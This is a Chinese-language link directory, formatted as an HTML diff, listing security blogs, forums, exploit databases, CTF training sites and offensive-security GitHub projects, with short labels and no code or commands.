+<p><a href="http://www.cnblogs.com/Ox9A82/（Ox9A82博客" target="_blank" rel="noopener">http://www.cnblogs.com/Ox9A82/（Ox9A82博客</a> ）</p>
+<p><a href="https://www.lshack.cn/" target="_blank" rel="noopener">https://www.lshack.cn/</a>    (lshack博客)</p>
+<p><a href="http://www.cnblogs.com/sevck/" target="_blank" rel="noopener">http://www.cnblogs.com/sevck/</a> （sevck博客）</p>
+<p><a href="https://tom0li.github.io（tom0li博客）" target="_blank" rel="noopener">https://tom0li.github.io（tom0li博客）</a></p>
+<p><a href="http://www.waitalone.cn/（独自等待博客）" target="_blank" rel="noopener">http://www.waitalone.cn/（独自等待博客）</a></p>
+<p><a href="https://wujunze.com/（wujunze博客）" target="_blank" rel="noopener">https://wujunze.com/（wujunze博客）</a></p>
+<p><a href="https://ht-sec.org（昊天博客）" target="_blank" rel="noopener">https://ht-sec.org（昊天博客）</a></p>
+<p><a href="http://docs.hackinglab.cn/（hackinglab博客）" target="_blank" rel="noopener">http://docs.hackinglab.cn/（hackinglab博客）</a></p>
+<p><a href="http://www.hackqing.com/（情博客）" target="_blank" rel="noopener">http://www.hackqing.com/（情博客）</a></p>
+<p><a href="http://www.milw0rm.cn（milw0rm博客）" target="_blank" rel="noopener">http://www.milw0rm.cn（milw0rm博客）</a></p>
+<p><a href="https://www.sitedirsec.com/（非安全中国博客" target="_blank" rel="noopener">https://www.sitedirsec.com/（非安全中国博客</a>    ）</p>
+<p><a href="http://www.arvinhk.com/（arivn博客）" target="_blank" rel="noopener">http://www.arvinhk.com/（arivn博客）</a></p>
+<p><a href="http://hk-xg.lofter.com/（hk-xg博客" target="_blank" rel="noopener">http://hk-xg.lofter.com/（hk-xg博客</a> ）</p>
+<p><a href="http://www.hackblog.cn/（" target="_blank" rel="noopener">http://www.hackblog.cn/（</a> hackblog博客）</p>
+<p><a href="http://piaoyu.org/（piaoyu博客）" target="_blank" rel="noopener">http://piaoyu.org/（piaoyu博客）</a></p>
+<p><a href="http://defcon.cn/script（defcon博客）" target="_blank" rel="noopener">http://defcon.cn/script（defcon博客）</a></p>
+<p><a href="http://www.jeehsu.com/（几许博客）" target="_blank" rel="noopener">http://www.jeehsu.com/（几许博客）</a></p>
+<p><a href="http://www.52bug.cn/（吾爱漏洞博客）" target="_blank" rel="noopener">http://www.52bug.cn/（吾爱漏洞博客）</a></p>
+<p><a href="http://www.moonsec.com/（暗月博客）" target="_blank" rel="noopener">http://www.moonsec.com/（暗月博客）</a></p>
+<p><a href="http://www.cnseay.com/（法师博客）" target="_blank" rel="noopener">http://www.cnseay.com/（法师博客）</a></p>
+<p><a href="http://www.exehack.net/（小残博客）" target="_blank" rel="noopener">http://www.exehack.net/（小残博客）</a></p>
+<p><a href="http://blog.knownsec.com/（知道创宇博客）" target="_blank" rel="noopener">http://blog.knownsec.com/（知道创宇博客）</a></p>
+<p><a href="http://www.keen8.com/（kee8博客" target="_blank" rel="noopener">http://www.keen8.com/（kee8博客</a>    ）</p>
+<p><a href="http://0ke.org/（" target="_blank" rel="noopener">http://0ke.org/（</a> 0ke博客 ）</p>
+<p><a href="http://www.storysec.com/（影风&#39;s" target="_blank" rel="noopener">http://www.storysec.com/（影风&#39;s</a> Blog）</p>
+<p><a href="http://www.weixianmanbu.com/（黑客技术博客）" target="_blank" rel="noopener">http://www.weixianmanbu.com/（黑客技术博客）</a></p>
+<p><a href="http://www.x14hack.com/" target="_blank" rel="noopener">http://www.x14hack.com/</a> （14xhack博客）</p>
+<p><a href="http://rcoil.me/（rcoil博客）" target="_blank" rel="noopener">http://rcoil.me/（rcoil博客）</a></p>
+<p><a href="https://perseus.codes/（perseus博客）" target="_blank" rel="noopener">https://perseus.codes/（perseus博客）</a></p>
+<p><a href="http://www.legendsec.org/" target="_blank" rel="noopener">http://www.legendsec.org/</a> (legendsec博客)</p>
+<p><a href="http://xiao106347.blog.163.com/（小刘kali博客）" target="_blank" rel="noopener">http://xiao106347.blog.163.com/（小刘kali博客）</a></p>
+<p><a href="http://blog.sycsec.com/(三叶草博客）" target="_blank" rel="noopener">http://blog.sycsec.com/(三叶草博客）</a></p>
+<p><a href="http://www.cnnetsec.com/（cnnetsec博客）" target="_blank" rel="noopener">http://www.cnnetsec.com/（cnnetsec博客）</a></p>
+<p><a href="http://iscc.gxu.edu.cn/index.php/Index/start" target="_blank" rel="noopener">http://iscc.gxu.edu.cn/index.php/Index/start</a> （iscc博客）</p>
+<p><a href="http://www.joychou.org/（joychou博客）" target="_blank" rel="noopener">http://www.joychou.org/（joychou博客）</a></p>
+<p><a href="http://rootkiter.com/EarthWorm/（rootkiter博客）" target="_blank" rel="noopener">http://rootkiter.com/EarthWorm/（rootkiter博客）</a></p>
+<p><a href="https://www.lmva.cc/" target="_blank" rel="noopener">https://www.lmva.cc/</a> (lmva博客)</p>
+<p><a href="http://www.evil0x.com/" target="_blank" rel="noopener">http://www.evil0x.com/</a> （十六进制）</p>
+<p><a href="https://ha.cker.in/（cker博客）" target="_blank" rel="noopener">https://ha.cker.in/（cker博客）</a></p>
+<p><a href="http://3xp10it.cc/(3xp10it博客）" target="_blank" rel="noopener">http://3xp10it.cc/(3xp10it博客）</a></p>
+<p><a href="http://wolvez.club/（lostwolf博客）" target="_blank" rel="noopener">http://wolvez.club/（lostwolf博客）</a></p>
+<p><a href="http://thief.one(thief博客）" target="_blank" rel="noopener">http://thief.one(thief博客）</a></p>
+<p><a href="http://simeon.blog.51cto.com/（simeon博客）" target="_blank" rel="noopener">http://simeon.blog.51cto.com/（simeon博客）</a></p>
+<p><a href="http://javaweb.org/（javaweb博客）" target="_blank" rel="noopener">http://javaweb.org/（javaweb博客）</a></p>
+<p><a href="http://qqhack8.blog.163.com/（k8博客）" target="_blank" rel="noopener">http://qqhack8.blog.163.com/（k8博客）</a></p>
+<p><a href="http://das.scusec.org/(scusec博客）" target="_blank" rel="noopener">http://das.scusec.org/(scusec博客）</a></p>
+<p><a href="http://www.zcgonvh.com/（草泥马之家博客）" target="_blank" rel="noopener">http://www.zcgonvh.com/（草泥马之家博客）</a></p>
+<p><a href="http://www.webbaozi.com/（包子博客）" target="_blank" rel="noopener">http://www.webbaozi.com/（包子博客）</a></p>
+<p><a href="http://blog.safebuff.com/（x17dev博客）" target="_blank" rel="noopener">http://blog.safebuff.com/（x17dev博客）</a></p>
+<p><a href="http://k1p4ss.sinaapp.com/（k1p4ss博客）" target="_blank" rel="noopener">http://k1p4ss.sinaapp.com/（k1p4ss博客）</a></p>
+<p><a href="http://www.daokers.com/（金刀客博客）" target="_blank" rel="noopener">http://www.daokers.com/（金刀客博客）</a></p>
+<p><a href="https://www.i0day.com/（小马博客）" target="_blank" rel="noopener">https://www.i0day.com/（小马博客）</a></p>
+<p><a href="http://www.cnblogs.com/SEC-fsq/（范世强博客）" target="_blank" rel="noopener">http://www.cnblogs.com/SEC-fsq/（范世强博客）</a></p>
+<p>国外：</p>
+<p><a href="http://www.lanmaster53.com/（lanmaster53博客）" target="_blank" rel="noopener">http://www.lanmaster53.com/（lanmaster53博客）</a></p>
+<p><a href="http://pen-testing.sans.org/blog/pen-testing（sans渗透测试博客）" target="_blank" rel="noopener">http://pen-testing.sans.org/blog/pen-testing（sans渗透测试博客）</a></p>
+<p><a href="https://digi.ninja/（digi渗透测试博客）" target="_blank" rel="noopener">https://digi.ninja/（digi渗透测试博客）</a></p>
+<p><a href="http://www.harmj0y.net/blog/（harmj0y渗透测试博客）" target="_blank" rel="noopener">http://www.harmj0y.net/blog/（harmj0y渗透测试博客）</a></p>
+<p><a href="http://nullsecurity.net/tools.html(nullsecurity渗透工具博客" target="_blank" rel="noopener">http://nullsecurity.net/tools.html(nullsecurity渗透工具博客</a>)</p>
+<p><a href="http://www.ehacking.net/（ehacking渗透测试博客）" target="_blank" rel="noopener">http://www.ehacking.net/（ehacking渗透测试博客）</a></p>
+<p><a href="http://www.kitploit.com/（kitploit.渗透测试博客）" target="_blank" rel="noopener">http://www.kitploit.com/（kitploit.渗透测试博客）</a></p>
+<p><a href="http://www.commonexploits.com/（commonexploits渗透测试博客）" target="_blank" rel="noopener">http://www.commonexploits.com/（commonexploits渗透测试博客）</a></p>
+<p><a href="https://adsecurity.org/(AD域渗透测试博客）" target="_blank" rel="noopener">https://adsecurity.org/(AD域渗透测试博客）</a></p>
+<p><a href="http://www.securitytube.net/（securitytube渗透视频教程博客）" target="_blank" rel="noopener">http://www.securitytube.net/（securitytube渗透视频教程博客）</a></p>
+<p><a href="https://www.dsinternals.com/en/（AD域渗透测试博客）" target="_blank" rel="noopener">https://www.dsinternals.com/en/（AD域渗透测试博客）</a></p>
+<p><a href="https://adsecurity.org/(AD域渗透博客）" target="_blank" rel="noopener">https://adsecurity.org/(AD域渗透博客）</a></p>
+<p><a href="http://blog.gentilkiwi.com/（mimikazhi博客）" target="_blank" rel="noopener">http://blog.gentilkiwi.com/（mimikazhi博客）</a></p>
+<p><a href="https://blog.0x80.org/（汽车安全博客）" target="_blank" rel="noopener">https://blog.0x80.org/（汽车安全博客）</a></p>
+<p><a href="http://sectools.org/tag/web-scanners/（安全工具下载博客）" target="_blank" rel="noopener">http://sectools.org/tag/web-scanners/（安全工具下载博客）</a></p>
+<p><a href="https://blog.netspi.com/（SQL注入技能博客）" target="_blank" rel="noopener">https://blog.netspi.com/（SQL注入技能博客）</a></p>
+<p><a href="http://www.sqlinjectionwiki.com/Categories/4/postgresql-sql-injection-cheat-sheet/（注入技能表博客）" target="_blank" rel="noopener">http://www.sqlinjectionwiki.com/Categories/4/postgresql-sql-injection-cheat-sheet/（注入技能表博客）</a></p>
+<p><a href="http://websec.ca/kb/sql_injection" target="_blank" rel="noopener">http://websec.ca/kb/sql_injection</a> (sql注入大全)</p>
+<p><a href="https://wn.com/httpheaderinjectionds（http头注入博客" target="_blank" rel="noopener">https://wn.com/httpheaderinjectionds（http头注入博客</a>)</p>
+<p><a href="http://www.devttys0.com/blog/（路由安全博客）" target="_blank" rel="noopener">http://www.devttys0.com/blog/（路由安全博客）</a></p>
+<p><a href="https://fail0verflow.com/（硬件大牛博客）" target="_blank" rel="noopener">https://fail0verflow.com/（硬件大牛博客）</a></p>
+<p><a href="http://www.blackhat.com/（黑帽大赛官方博客）" target="_blank" rel="noopener">http://www.blackhat.com/（黑帽大赛官方博客）</a></p>
+<p><a href="http://www.social-engineer.org/(社会工程学博客）" target="_blank" rel="noopener">http://www.social-engineer.org/(社会工程学博客）</a></p>
+<p><a href="http://www.windowsecurity.com/（window安全博客）" target="_blank" rel="noopener">http://www.windowsecurity.com/（window安全博客）</a></p>
+<p><a href="https://www.blackmoreops.com/（linux安全博客）" target="_blank" rel="noopener">https://www.blackmoreops.com/（linux安全博客）</a></p>
+<p><a href="http://http-tunnel.sourceforge.net/" target="_blank" rel="noopener">http://http-tunnel.sourceforge.net/</a> (http-tunnel反向代理博客）</p>
+<p><a href="https://zmap.io/（zmap博客）" target="_blank" rel="noopener">https://zmap.io/（zmap博客）</a></p>
+<p><a href="https://www.thc.org/（thc博客）" target="_blank" rel="noopener">https://www.thc.org/（thc博客）</a></p>
+<p><a href="http://mydowndown.com/y2down" target="_blank" rel="noopener">http://mydowndown.com/y2down</a> (youtuble视频下载）</p>
+<p><a href="http://securityxploded.com/download.php（国外密码工具大全）" target="_blank" rel="noopener">http://securityxploded.com/download.php（国外密码工具大全）</a></p>
+<p><a href="https://pentest.blog/（渗透测试博客）" target="_blank" rel="noopener">https://pentest.blog/（渗透测试博客）</a></p>
+<p><a href="http://www.rekings.com/blog/（rekings博客" target="_blank" rel="noopener">http://www.rekings.com/blog/（rekings博客</a>)</p>
+<p><a href="http://www.hackingarticles.in（黑客文章知识库）" target="_blank" rel="noopener">http://www.hackingarticles.in（黑客文章知识库）</a></p>
+<p><a href="http://fuzzysecurity.com/tutorials/16.html（fuzzysecurity博客）" target="_blank" rel="noopener">http://fuzzysecurity.com/tutorials/16.html（fuzzysecurity博客）</a></p>
+<p><a href="https://artkond.com/2017/03/23/pivoting-guide/（artkond博客）" target="_blank" rel="noopener">https://artkond.com/2017/03/23/pivoting-guide/（artkond博客）</a></p>
+<p><a href="http://www.hacking-tutorial.com（haking博客）" target="_blank" rel="noopener">http://www.hacking-tutorial.com（haking博客）</a></p>
+<p><a href="https://legalhackers.com/（legalhackers博客）" target="_blank" rel="noopener">https://legalhackers.com/（legalhackers博客）</a></p>
+<p><a href="https://blog.quarkslab.com/（quarkslab博客）" target="_blank" rel="noopener">https://blog.quarkslab.com/（quarkslab博客）</a></p>
+<p><a href="https://foxglovesecurity.com/" target="_blank" rel="noopener">https://foxglovesecurity.com/</a> （foxglovesecurity博客）</p>
+<p><a href="http://carnal0wnage.attackresearch.com/（attackresearch博客）" target="_blank" rel="noopener">http://carnal0wnage.attackresearch.com/（attackresearch博客）</a></p>
+<p><a href="https://www.darknet.org.uk/" target="_blank" rel="noopener">https://www.darknet.org.uk/</a></p>
+<p><a href="https://room362.com/（room362博客）" target="_blank" rel="noopener">https://room362.com/（room362博客）</a></p>
+<p><a href="http://blog.portswigger.net/（burpsuit博客）" target="_blank" rel="noopener">http://blog.portswigger.net/（burpsuit博客）</a></p>
+<p><a href="https://blog.skullsecurity.org/（关于CTF）" target="_blank" rel="noopener">https://blog.skullsecurity.org/（关于CTF）</a></p>
+<p><a href="https://community.rapid7.com/community/metasploit/blog(MSF官方博客）" target="_blank" rel="noopener">https://community.rapid7.com/community/metasploit/blog(MSF官方博客）</a></p>
+<p><a href="http://www.tssci-security.com/（tssci博客）" target="_blank" rel="noopener">http://www.tssci-security.com/（tssci博客）</a></p>
+<p><a href="http://blog.gdssecurity.com/（gdssecurity博客）" target="_blank" rel="noopener">http://blog.gdssecurity.com/（gdssecurity博客）</a></p>
+<p><a href="https://websec.wordpress.com（websec博客）" target="_blank" rel="noopener">https://websec.wordpress.com（websec博客）</a></p>
+<p><a href="http://bernardodamele.blogspot.com/（blogspot博客）" target="_blank" rel="noopener">http://bernardodamele.blogspot.com/（blogspot博客）</a></p>
+<p><a href="http://laramies.blogspot.com/（blogspot博客）" target="_blank" rel="noopener">http://laramies.blogspot.com/（blogspot博客）</a></p>
+<p><a href="https://clymb3r.wordpress.com/" target="_blank" rel="noopener">https://clymb3r.wordpress.com/</a> (clymb3r博客)</p>
+<p><a href="https://www.cyberciti.biz（博客）" target="_blank" rel="noopener">https://www.cyberciti.biz（博客）</a></p>
+<p><a href="http://www.spylogic.net/（spylogic博客）" target="_blank" rel="noopener">http://www.spylogic.net/（spylogic博客）</a></p>
+<p><a href="http://pentestmonkey.net/blog（pentestmonkey博客）" target="_blank" rel="noopener">http://pentestmonkey.net/blog（pentestmonkey博客）</a></p>
+<p><a href="https://www.commonexploits.com/（commonexploits博客）" target="_blank" rel="noopener">https://www.commonexploits.com/（commonexploits博客）</a></p>
+<p><a href="https://sensepost.com/blog/（sensepost博客）" target="_blank" rel="noopener">https://sensepost.com/blog/（sensepost博客）</a></p>
+<p><a href="http://exploit.co.il/blog/（exploit博客）" target="_blank" rel="noopener">http://exploit.co.il/blog/（exploit博客）</a></p>
+<p><a href="http://sirdarckcat.blogspot.com/（sirdarckcat博客）" target="_blank" rel="noopener">http://sirdarckcat.blogspot.com/（sirdarckcat博客）</a></p>
+<p><a href="http://reusablesec.blogspot.com/（reusablesec博客）" target="_blank" rel="noopener">http://reusablesec.blogspot.com/（reusablesec博客）</a></p>
+<p><a href="https://www.trustwave.com/（trustwave博客）" target="_blank" rel="noopener">https://www.trustwave.com/（trustwave博客）</a></p>
+<p><a href="https://www.corelan.be/（corelan博客）" target="_blank" rel="noopener">https://www.corelan.be/（corelan博客）</a></p>
+<p><a href="https://www.notsosecure.com/blog/（notsosecure博客）" target="_blank" rel="noopener">https://www.notsosecure.com/blog/（notsosecure博客）</a></p>
+<p><a href="https://securityreliks.wordpress.com/（securityreliks博客）" target="_blank" rel="noopener">https://securityreliks.wordpress.com/（securityreliks博客）</a></p>
+<p><a href="http://ihazomgsecurityskillz.blogspot.com/（linux内核）" target="_blank" rel="noopener">http://ihazomgsecurityskillz.blogspot.com/（linux内核）</a></p>
+<p><a href="https://memset.wordpress.com/（memset博客）" target="_blank" rel="noopener">https://memset.wordpress.com/（memset博客）</a></p>
+<p><a href="http://gynvael.coldwind.pl/?blog=1&amp;lang=en（gynvael博客）" target="_blank" rel="noopener">http://gynvael.coldwind.pl/?blog=1&amp;lang=en（gynvael博客）</a></p>
+<p><a href="https://blog.g0tmi1k.com/（g0tmi1k博客）" target="_blank" rel="noopener">https://blog.g0tmi1k.com/（g0tmi1k博客）</a></p>
+<p><a href="https://digi.ninja/（digi博客）" target="_blank" rel="noopener">https://digi.ninja/（digi博客）</a></p>
+<p><a href="http://pentestit.com/（pentestit博客）" target="_blank" rel="noopener">http://pentestit.com/（pentestit博客）</a></p>
+<p><a href="https://www.shellntel.com/（shellntel博客）" target="_blank" rel="noopener">https://www.shellntel.com/（shellntel博客）</a></p>
+<p><a href="http://www.irongeek.com/（irongeek博客）" target="_blank" rel="noopener">http://www.irongeek.com/（irongeek博客）</a></p>
+<p><a href="https://bitvijays.github.io/（bitvijays博客）" target="_blank" rel="noopener">https://bitvijays.github.io/（bitvijays博客）</a></p>
+<p><a href="https://pentestlab.blog（渗透检测实验室博客）" target="_blank" rel="noopener">https://pentestlab.blog（渗透检测实验室博客）</a></p>
+<p><a href="https://www.hackthissite.org/forums/index.php（国外黑客论坛）" target="_blank" rel="noopener">https://www.hackthissite.org/forums/index.php（国外黑客论坛）</a></p>
+<p>在线知识：<br><a href="http://wiki.ioin.in/（安全文库）" target="_blank" rel="noopener">http://wiki.ioin.in/（安全文库）</a></p>
+<p><a href="http://bobao.360.cn/learning/index（安全客知识库）" target="_blank" rel="noopener">http://bobao.360.cn/learning/index（安全客知识库）</a></p>
+<p><a href="https://www.hackfun.org/kali-tools/kali-tools-zh.html(" target="_blank" rel="noopener">https://www.hackfun.org/kali-tools/kali-tools-zh.html(</a> KALI工具使用说明)</p>
+<p><a href="https://www.gitbook.com/book/t0data/burpsuite/details" target="_blank" rel="noopener">https://www.gitbook.com/book/t0data/burpsuite/details</a> （burpsuit中文指南）</p>
+<p><a href="http://www.w3school.com.cn/（" target="_blank" rel="noopener">http://www.w3school.com.cn/（</a> w3school在线学习 ）</p>
+<p><a href="http://www.runoob.com/" target="_blank" rel="noopener">http://www.runoob.com/</a> (it脚本学习）</p>
+<p><a href="http://www.ziqiangxuetang.com/django" target="_blank" rel="noopener">http://www.ziqiangxuetang.com/django</a> （djiango之python学习）</p>
+<p><a href="http://www.sec-wiki.com/（安全技能库）" target="_blank" rel="noopener">http://www.sec-wiki.com/（安全技能库）</a></p>
+<p><a href="http://www.oschina.net/（源代码）" target="_blank" rel="noopener">http://www.oschina.net/（源代码）</a></p>
+<p><a href="http://paper.seebug.org/" target="_blank" rel="noopener">http://paper.seebug.org/</a> (seebug安全知识库)</p>
+<p><a href="https://bowen.navisec.it/（安全文库）" target="_blank" rel="noopener">https://bowen.navisec.it/（安全文库）</a></p>
+<p><a href="http://expku.com/（国内exp搜索大全）" target="_blank" rel="noopener">http://expku.com/（国内exp搜索大全）</a></p>
+<p><a href="http://www.exploitsearch.net（exp搜索）" target="_blank" rel="noopener">http://www.exploitsearch.net（exp搜索）</a></p>
+<p>论坛与导航：<br><a href="http://www.hegouvip.com/（合购资源网）" target="_blank" rel="noopener">http://www.hegouvip.com/（合购资源网）</a></p>
+<p><a href="http://www.anquanquan.info/（安全圈导航）" target="_blank" rel="noopener">http://www.anquanquan.info/（安全圈导航）</a></p>
+<p><a href="http://navisec.it/" target="_blank" rel="noopener">http://navisec.it/</a> （navisec导航）</p>
+<p><a href="http://cmcc.ml/（cmcc网址安全导航）" target="_blank" rel="noopener">http://cmcc.ml/（cmcc网址安全导航）</a></p>
+<p><a href="http://www.pediy.com/（看雪论坛" target="_blank" rel="noopener">http://www.pediy.com/（看雪论坛</a> ）</p>
+<p><a href="http://www.52pojie.cn/（吾爱破解" target="_blank" rel="noopener">http://www.52pojie.cn/（吾爱破解</a> ）</p>
+<p><a href="http://www.metasploit.cn/（metasploit论坛）" target="_blank" rel="noopener">http://www.metasploit.cn/（metasploit论坛）</a></p>
+<p><a href="https://xianzhi.aliyun.com/forum/read/723.html" target="_blank" rel="noopener">https://xianzhi.aliyun.com/forum/read/723.html</a> （先知社区）</p>
+<p><a href="http://www.pd521.com/（安卓逆向论坛）" target="_blank" rel="noopener">http://www.pd521.com/（安卓逆向论坛）</a></p>
+<p><a href="http://bbs.ichunqiu.com/(爱春秋论坛" target="_blank" rel="noopener">http://bbs.ichunqiu.com/(爱春秋论坛</a>)</p>
+<p><a href="http://hackinglab.cn/（hack实验室）" target="_blank" rel="noopener">http://hackinglab.cn/（hack实验室）</a></p>
+<p><a href="https://www.t00ls.net/(t00ls论坛" target="_blank" rel="noopener">https://www.t00ls.net/(t00ls论坛</a> )</p>
+<p><a href="https://forum.90sec.org/（90sec论坛" target="_blank" rel="noopener">https://forum.90sec.org/（90sec论坛</a>)</p>
+<p><a href="https://www.70sec.com/(70sec论坛" target="_blank" rel="noopener">https://www.70sec.com/(70sec论坛</a>)</p>
+<p><a href="https://forum.exploit.in/(exploit论坛" target="_blank" rel="noopener">https://forum.exploit.in/(exploit论坛</a>)</p>
+<p><a href="http://forum.exetools.com/index.php（explotools论坛）" target="_blank" rel="noopener">http://forum.exetools.com/index.php（explotools论坛）</a></p>
+<p><a href="https://www.v2ex.com/（v2ex程序员社区）" target="_blank" rel="noopener">https://www.v2ex.com/（v2ex程序员社区）</a></p>
+<p>安全资讯：<br><a href="http://www.freebuf.com/（freebuf安全媒体）" target="_blank" rel="noopener">http://www.freebuf.com/（freebuf安全媒体）</a></p>
+<p><a href="http://www.0daybank.org/(" target="_blank" rel="noopener">http://www.0daybank.org/(</a> 漏洞银行安全资讯)</p>
+<p><a href="https://www.secpulse.com/（安全脉搏安全资讯）" target="_blank" rel="noopener">https://www.secpulse.com/（安全脉搏安全资讯）</a></p>
+<p><a href="http://www.secbox.cn/（安全盒子资讯）" target="_blank" rel="noopener">http://www.secbox.cn/（安全盒子资讯）</a></p>
+<p><a href="http://www.secist.com/(即刻安全资讯）" target="_blank" rel="noopener">http://www.secist.com/(即刻安全资讯）</a></p>
+<p><a href="https://www.sec-wiki.com/（wiki安全资讯）" target="_blank" rel="noopener">https://www.sec-wiki.com/（wiki安全资讯）</a></p>
+<p><a href="http://www.mottoin.com/（猫眼安全媒体" target="_blank" rel="noopener">http://www.mottoin.com/（猫眼安全媒体</a>)</p>
+<p><a href="http://www.4hou.com/（嘶吼安全媒体）" target="_blank" rel="noopener">http://www.4hou.com/（嘶吼安全媒体）</a></p>
+<p>漏洞预警和exp查询：<br><a href="http://wy.hx99.net/（乌云搜索）" target="_blank" rel="noopener">http://wy.hx99.net/（乌云搜索）</a></p>
+<p><a href="https://loudong.sjtu.edu.cn/（教育行业安全漏洞）" target="_blank" rel="noopener">https://loudong.sjtu.edu.cn/（教育行业安全漏洞）</a></p>
+<p><a href="http://webscan.360.cn/vul（网站常见漏洞）" target="_blank" rel="noopener">http://webscan.360.cn/vul（网站常见漏洞）</a></p>
+<p><a href="https://cxsecurity.com/wlb/（国外漏洞）" target="_blank" rel="noopener">https://cxsecurity.com/wlb/（国外漏洞）</a></p>
+<p><a href="http://blogs.360.cn/（360漏洞技术博客）" target="_blank" rel="noopener">http://blogs.360.cn/（360漏洞技术博客）</a></p>
+<p><a href="http://xteam.baidu.com/（百度实验室" target="_blank" rel="noopener">http://xteam.baidu.com/（百度实验室</a>    ）</p>
+<p><a href="http://blog.nsfocus.net/（绿盟漏洞预警博客）" target="_blank" rel="noopener">http://blog.nsfocus.net/（绿盟漏洞预警博客）</a></p>
+<p><a href="https://www.seebug.org/（seebug漏洞预警）" target="_blank" rel="noopener">https://www.seebug.org/（seebug漏洞预警）</a></p>
+<p><a href="http://www.cnvd.org.cn/（cnvd漏洞平台）" target="_blank" rel="noopener">http://www.cnvd.org.cn/（cnvd漏洞平台）</a></p>
+<p><a href="https://www.vulnhub.com/（漏洞测试平台）" target="_blank" rel="noopener">https://www.vulnhub.com/（漏洞测试平台）</a></p>
+<p><a href="https://www.exploit-db.com/papers/（exploit-db漏洞库）" target="_blank" rel="noopener">https://www.exploit-db.com/papers/（exploit-db漏洞库）</a></p>
+<p><a href="https://technet.microsoft.com/en-us/library/security/mt637763.aspx（微软exp版本号列表）" target="_blank" rel="noopener">https://technet.microsoft.com/en-us/library/security/mt637763.aspx（微软exp版本号列表）</a></p>
+<p><a href="https://bugs.chromium.org/p/project-zero/issues/list（微软漏洞下载搜索）" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/list（微软漏洞下载搜索）</a></p>
+<p><a href="https://www.kernel-exploits.com/(linxu内核exp查询）" target="_blank" rel="noopener">https://www.kernel-exploits.com/(linxu内核exp查询）</a></p>
+<p><a href="http://exploit.linuxnote.org/（国内linux内核EXP查询）" target="_blank" rel="noopener">http://exploit.linuxnote.org/（国内linux内核EXP查询）</a></p>
+<p><a href="https://packetstormsecurity.com/（packetstormsecurity" target="_blank" rel="noopener">https://packetstormsecurity.com/（packetstormsecurity</a> 的exp查询）</p>
+<p><a href="http://cve.mitre.org/（漏洞编号查询）" target="_blank" rel="noopener">http://cve.mitre.org/（漏洞编号查询）</a></p>
+<p><a href="http://www.securiteam.com/（安全团队）" target="_blank" rel="noopener">http://www.securiteam.com/（安全团队）</a></p>
+<p><a href="http://www.securityfocus.com/（安全焦点）" target="_blank" rel="noopener">http://www.securityfocus.com/（安全焦点）</a></p>
+<p><a href="http://www.securitytracker.com（securitytracker）" target="_blank" rel="noopener">http://www.securitytracker.com（securitytracker）</a></p>
+<p><a href="http://www.guninski.com/（guninski的exp查询）" target="_blank" rel="noopener">http://www.guninski.com/（guninski的exp查询）</a></p>
+<p><a href="http://cxsecurity.com/（漏洞库）" target="_blank" rel="noopener">http://cxsecurity.com/（漏洞库）</a></p>
+<p><a href="http://www.routerpwn.com/（路由漏洞查询）" target="_blank" rel="noopener">http://www.routerpwn.com/（路由漏洞查询）</a></p>
+<p><a href="http://www.sebug.net/vuldb/vulnerabilities（WEB漏洞库查询）" target="_blank" rel="noopener">http://www.sebug.net/vuldb/vulnerabilities（WEB漏洞库查询）</a></p>
+<p><a href="http://0day5.com/（WEB漏洞时代）" target="_blank" rel="noopener">http://0day5.com/（WEB漏洞时代）</a></p>
+<p><a href="http://www.ussrback.com/（ussrback的exp查询）" target="_blank" rel="noopener">http://www.ussrback.com/（ussrback的exp查询）</a></p>
+<p><a href="http://cn.0day.today/（oday" target="_blank" rel="noopener">http://cn.0day.today/（oday</a>)</p>
+<p><a href="http://xssor.io/" target="_blank" rel="noopener">http://xssor.io/</a> (xss poc大全)</p>
+<p>在线web扫描器：<br><a href="http://webscan.360.cn/" target="_blank" rel="noopener">http://webscan.360.cn/</a></p>
+<p><a href="http://site.safedog.cn/index.html" target="_blank" rel="noopener">http://site.safedog.cn/index.html</a></p>
+<p><a href="http://www.wmirror.org/" target="_blank" rel="noopener">http://www.wmirror.org/</a></p>
+<p>CTF训练：<br><a href="http://www.shiyanbar.com/ctf/practice（CTF训练营）" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/practice（CTF训练营）</a></p>
+<p><a href="https://xss.haozi.me/#/(xss闯关）" target="_blank" rel="noopener">https://xss.haozi.me/#/(xss闯关）</a></p>
+<p><a href="http://oj.xctf.org.cn/web/login/?next=/（xctf）" target="_blank" rel="noopener">http://oj.xctf.org.cn/web/login/?next=/（xctf）</a></p>
+<p><a href="http://bobao.360.cn/ctf/index（360CTF训练营" target="_blank" rel="noopener">http://bobao.360.cn/ctf/index（360CTF训练营</a> ）</p>
+<p><a href="http://hackinglab.cn/（网络安全对抗平台" target="_blank" rel="noopener">http://hackinglab.cn/（网络安全对抗平台</a> ）</p>
+<p><a href="https://pwnhub.cn/(CTF比赛" target="_blank" rel="noopener">https://pwnhub.cn/(CTF比赛</a>)</p>
+<p><a href="https://www.xctf.org.cn/（xctf社区）" target="_blank" rel="noopener">https://www.xctf.org.cn/（xctf社区）</a></p>
+<p><a href="http://bobao.360.cn/ctf/（360CTF社区）" target="_blank" rel="noopener">http://bobao.360.cn/ctf/（360CTF社区）</a></p>
+<p><a href="https://ctftime.org/（ctftime社区）" target="_blank" rel="noopener">https://ctftime.org/（ctftime社区）</a></p>
+<p>github项目：<br><a href="https://github.com/ctfs/（CTFwrite" target="_blank" rel="noopener">https://github.com/ctfs/（CTFwrite</a> ）</p>
+<p><a href="https://github.com/powershellempire/empire（powershllempire项目）" target="_blank" rel="noopener">https://github.com/powershellempire/empire（powershllempire项目）</a></p>
+<p><a href="https://github.com/adaptivethreat/EmPyre（EmPyre项目）" target="_blank" rel="noopener">https://github.com/adaptivethreat/EmPyre（EmPyre项目）</a></p>
+<p><a href="https://github.com/HarmJ0y/Malleable-C2-Profiles(Malleable-C2-Profiles项目）" target="_blank" rel="noopener">https://github.com/HarmJ0y/Malleable-C2-Profiles(Malleable-C2-Profiles项目）</a></p>
+<p><a href="https://github.com/Veil-Framework/Veil-Evasion（Veil-Evasion免杀项目）" target="_blank" rel="noopener">https://github.com/Veil-Framework/Veil-Evasion（Veil-Evasion免杀项目）</a></p>
+<p><a href="https://github.com/offensive-security（offensive-security项目）" target="_blank" rel="noopener">https://github.com/offensive-security（offensive-security项目）</a></p>
+<p><a href="https://github.com/secretsquirrel/the-backdoor-factory/（the-backdoor-factory项目）" target="_blank" rel="noopener">https://github.com/secretsquirrel/the-backdoor-factory/（the-backdoor-factory项目）</a></p>
